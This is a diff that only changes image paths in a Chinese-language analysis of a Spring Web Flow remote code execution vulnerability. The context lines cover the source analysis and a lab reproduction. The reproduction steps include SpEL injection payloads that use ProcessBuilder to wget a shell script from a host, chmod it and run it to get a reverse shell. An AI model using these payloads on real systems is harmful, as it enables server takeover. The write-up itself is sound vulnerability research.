@@ -6,7 +6,7 @@ author: yaof
 
 # <center>Spring Web Flow 远程代码执行漏洞分析</center> #
 
-<center>![Spring](../images/yaof_images/Spring.jpg)</center>
+<center>![Spring](images/yaof_images/Spring.jpg)</center>
 
 ## 1.&emsp;漏洞描述 ##
 
@@ -26,14 +26,14 @@ author: yaof
 
 &emsp;&emsp;首先我们可以从Spring Web Flow官网找到Spring Web Flow源码[github](https://github.com/spring-projects/spring-webflow "https://github.com/spring-projects/spring-webflow")地址，然后通过找到补丁提交的源代码主要在[spring-webflow/src/main/java/org/springframework/webflow/mvc/view/AbstractMvcView.java](https://github.com/spring-projects/spring-webflow/compare/2.5.x#diff-d9efeba3700c0135e224911fadb39795 "https://github.com/spring-projects/spring-webflow/compare/2.5.x#diff-d9efeba3700c0135e224911fadb39795")文件中修改，查看和上一个版本的源码比较：
 
-<center>![Spring](../images/yaof_images/9.png)</center>
+<center>![Spring](images/yaof_images/9.png)</center>
 
 
 ### 3.2 &emsp;源码分析 ###
 
 &emsp;&emsp;我们发现这里对 addEmptyValueMapping(DefaultMapper mapper, String field, Object model) 这个方法里面表达式解析的实现类进行了替换，直接使用了BeanWrapperExpressionParser来解析，关于这个类我们后面再详细说，那么知道触发漏洞的函数后，我们就可以用MyEclipse来跟踪下函数调用栈，具体如下：
 
-<center>![Spring](../images/yaof_images/10.png)</center>
+<center>![Spring](images/yaof_images/10.png)</center>
 
 &emsp;&emsp;通过调用关系我们可以发现一共有一下两个函数调用了addEmptyValueMapping方法
 
@@ -42,15 +42,15 @@ author: yaof
 
 &emsp;&emsp;这里通过调用关系我们可以大概的搞明白Spring WebFlow的执行顺序和流程，由flowcontroller决定将请求交给那个handler去执行具体的流程，这里我们需要知道当用户请求有视图状态处理时，会决定当前事件下一个执行的流程，同时对于配置文件中我们配置的view-state元素，如果我们指定了数据的model，那么它会自动进行数据绑定，xml结构如下(这里以官方的example中的book项目为例子):
 
-<center>![Spring](../images/yaof_images/11.png)</center>
+<center>![Spring](images/yaof_images/11.png)</center>
 
 &emsp;&emsp;本次漏洞出现的原因就是在view-state节点中数据绑定上，我们继续跟踪addEmptyValueMapping方法的调用过程，这里通过eclipse我们可以发现bind方法间接的调用了addEmptyValueMapping函数，
 
-<center>![Spring](../images/yaof_images/12.png)</center>
+<center>![Spring](images/yaof_images/12.png)</center>
 
 &emsp;&emsp;到这里我们知道了addEmptyValueMapping函数存在表达式执行的点，我们现在来详细看下这个addEmptyValueMapping函数，如下图
 
-<center>![Spring](../images/yaof_images/13.png)</center>
+<center>![Spring](images/yaof_images/13.png)</center>
 
 &emsp;&emsp;这里我们可以看见，只有控制了field参数才能出发漏洞，所以我们重点是找到有没有点我们可以控制从而控制field参数来进行任意代码执行，这里明确目标后，我们回过头来看addDefaultMappings和addModelBindings这两个函数，既然这两个函数都调用了存在缺陷的函数，那么我们看看这两个函数的区别是什么，而且那个函数能能能控制field参数，两个函数的区别如下
 
@@ -109,11 +109,11 @@ author: yaof
 
 &emsp;&emsp;这里为什么一定要useSpringBeanBinding的值为false，我们来看一下addEmptyValueMapping函数，这里的expressionParser变量的声明类是ExpressionParser接口，那么决定最后 expressionParser.parseExpression(field, parserContext)这个函数来执行任意表达式是这个变量的赋值，那么在spring webflow中这个expressionParser的默认值就是WebFlowELExpressionParser的实例，这个类表达式默认的解析是有spel来执行的，具体可以去跟踪函数，那么在org.springframework.webflow.mvc.builder.MvcViewFactoryCreator.createViewFactory(Expression, ExpressionParser, ConversionService, BinderConfiguration, Validator, ValidationHintResolver)这个类如下图
 
-<center>![Spring](../images/yaof_images/14.png)</center>
+<center>![Spring](images/yaof_images/14.png)</center>
 
 &emsp;&emsp;我们可以看见如果useSpringBeanBinding这个属性为false那么久使用默认的解析类，如果这个值为true就由BeanWrapperExpressionParser这个类来解析，这个类的parseExpression函数
 
-<center>![Spring](../images/yaof_images/15.png)</center>
+<center>![Spring](images/yaof_images/15.png)</center>
 
 &emsp;&emsp;首先决定了能不能执行的第一个控制变量是allowDelimitedEvalExpressions，这个默认值是false，所以这里是执行不了表达式的。
 所以这里必须满足useSpringBeanBinding这个默认值不被改变。
@@ -130,62 +130,62 @@ author: yaof
 
 * MyEclipse点击file选项选择Import
 
-<center>![Spring](../images/yaof_images/16.png)</center>
+<center>![Spring](images/yaof_images/16.png)</center>
 
 * 点击进入选择maven功能里的Existing Maven Project选项
 
-<center>![Spring](../images/yaof_images/17.png)</center>
+<center>![Spring](images/yaof_images/17.png)</center>
 
 * 选择你工程的路径直接导入点击Finish按钮进行导入
 
-<center>![Spring](../images/yaof_images/18.png)</center>
+<center>![Spring](images/yaof_images/18.png)</center>
 
 * 成功导入工程后找到WebFlowConfig.java文件，将文件中factoryCreator.setUseSpringBeanBinding(true);的true改为false：
 
-<center>![Spring](../images/yaof_images/19.png)</center>
+<center>![Spring](images/yaof_images/19.png)</center>
 
 * 点击工程直接运行就可以看到生成的网页：
 
-<center>![Spring](../images/yaof_images/20.png)</center>
+<center>![Spring](images/yaof_images/20.png)</center>
 
 ### 4.3&emsp;漏洞复现 ###
 
 1.点击页面中的超链接进入图书搜索页面，在页面中输入搜索内容进行搜索
 
-<center>![Spring](../images/yaof_images/22.png)</center>
+<center>![Spring](images/yaof_images/22.png)</center>
 
 2.搜索到图书点击View hotel按钮，然后点击Book hotel按钮，如果没有登录请先登录（登录名密码圈出来了，4种任意都可以登录）
 
-<center>![Spring](../images/yaof_images/21.png)</center>
+<center>![Spring](images/yaof_images/21.png)</center>
 
 3.进入借书页面，随意写入16位Credit Card id和Credit Card Name点击Process按钮
 
-<center>![Spring](../images/yaof_images/24.png)</center>
+<center>![Spring](images/yaof_images/24.png)</center>
 
 4.在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：`&_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei`，shell.sh放在可以访问的服务器中，执行请求包。
 
-<center>![Spring](../images/yaof_images/1.png)</center>
+<center>![Spring](images/yaof_images/1.png)</center>
 
 5.查看自己虚拟机的/tmp目录下有没有成功下shell.sh,可以看到shell.sh成功下载
 
-<center>![Spring](../images/yaof_images/2.png)</center>
+<center>![Spring](images/yaof_images/2.png)</center>
 
 6.至此已经复现了漏洞，可是我们既然想代码执行，那我们就可以进行反弹shell操作，继续执行命令，添加payload：`&_(new+java.lang.ProcessBuilder("/bin/chmod","777","/tmp/shell.sh")).start()=feifei`对shell.sh修改权限
 
-<center>![Spring](../images/yaof_images/3.png)</center>
+<center>![Spring](images/yaof_images/3.png)</center>
 
 7.查看虚拟机中的/tmp目录下的shell.sh有没有变成可读可写可执行权限，可以看到shell.sh权限成功变成777
 
-<center>![Spring](../images/yaof_images/4.png)</center>
+<center>![Spring](images/yaof_images/4.png)</center>
 
 8.执行shell.sh文件同时监听2333端口，执行payload:`&_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei`
 
-<center>![Spring](../images/yaof_images/5.png)</center>
+<center>![Spring](images/yaof_images/5.png)</center>
 
-<center>![Spring](../images/yaof_images/6.png)</center>
+<center>![Spring](images/yaof_images/6.png)</center>
 
 9.在监听的服务器中查看监听的2333端口有没有反弹shell，可以看到成功反弹shell，可以执行权限内任意命令。
-<center>![Spring](../images/yaof_images/7.png)</center>
+<center>![Spring](images/yaof_images/7.png)</center>
 
 ## 5.&emsp;修复意见 ##
 
